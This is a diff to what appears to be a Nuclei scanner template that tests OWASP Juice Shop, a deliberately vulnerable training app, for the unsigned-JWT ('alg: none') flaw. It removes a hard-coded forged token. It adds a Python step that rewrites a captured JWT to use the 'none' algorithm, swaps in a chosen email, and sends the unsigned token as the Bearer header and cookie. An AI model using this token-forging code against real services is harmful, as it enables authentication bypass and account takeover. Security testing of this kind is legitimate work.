@@ -7,31 +7,8 @@ info:
   description: Automating JWT token manipulation to test for unsigned JWT vulnerability.
 
 flow: |
-  http(1) && http(2)
+  http(1) && code() && http(2)
 
-variables:
-  header: '{"typ":"JWT","alg":"none"}'
-  payload: >-
-    {
-      "status": "success",
-      "data": {
-        "id": 22,
-        "username": "",
-        "email": "jwtn3d@juice-sh.op",
-        "password": "f0be17b0fc1b698e86b704548693e674",
-        "role": "customer",
-        "deluxeToken": "",
-        "lastLoginIp": "10.0.2.100",
-        "profileImage": "/assets/public/images/uploads/default.svg",
-        "totpSecret": "",
-        "isActive": true,
-        "createdAt": "2025-03-17 16:35:21.286 +00:00",
-        "updatedAt": "2025-03-17 20:21:42.219 +00:00",
-        "deletedAt": null
-      },
-      "iat": 1742242914
-    }
-  final_payload: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImZmZTVhMTZkODQ4MDgwMDYyNDQxMDVmNmM4MTAwNzBkIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEwLjAuMi4xMDAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wMy0xOCAyMzoyODo1OS44OTUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wMy0xOCAyMzozMDoyMC45MDYgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzQyMzQyMjExfQ.'
 
 requests:
   - raw:
@@ -58,8 +35,8 @@ requests:
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
         Accept: application/json, text/plain, */*
-        Authorization: Bearer {{final_payload}}
-        Cookie: language=en; token={{final_payload}}
+        Authorization: Bearer {{code_response}}
+        Cookie: language=en; token={{code_response}}
 
     matchers:
       - type: status
@@ -77,4 +54,34 @@ requests:
           - '"([a-zA-Z0-9._%+-]+@juice-sh\.op)"'
         part: body
 
+code: 
+  - engine: 
+      - python3
+    source: |
+      import base64
+      import json
+      import os
 
+      def b64url_encode(data):
+          return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+      def b64url_decode(data):
+          padding = '=' * (4 - len(data) % 4)
+          return base64.urlsafe_b64decode(data + padding)
+
+      jwt_input = os.getenv('jwt_token','')
+      header_b64, payload_b64, signature = jwt_input.split('.')
+
+      # Decode and modify payload
+      payload_json = json.loads(b64url_decode(payload_b64).decode())
+      payload_json['data']['email'] = "jwtn3d@juice-sh.op"
+
+      # New header with 'none' algorithm
+      new_header = {"typ": "JWT", "alg": "none"}
+      new_header_b64 = b64url_encode(json.dumps(new_header).encode())
+      new_payload_b64 = b64url_encode(json.dumps(payload_json).encode())
+
+      # Assemble unsigned token
+      final_token = f"{new_header_b64}.{new_payload_b64}."
+      print(final_token)
+# digest: 490a0046304402200b31909b5116f9fa21fe0b94e5b9ec9fb17ae76050efa9e3e8da0e81481c923e022059ef6b473089aa942ecfe49a6b9dfead78377d6af9b8a24fa341a300006b9b54:0dd34f63ed422f65711fe796f66903bf
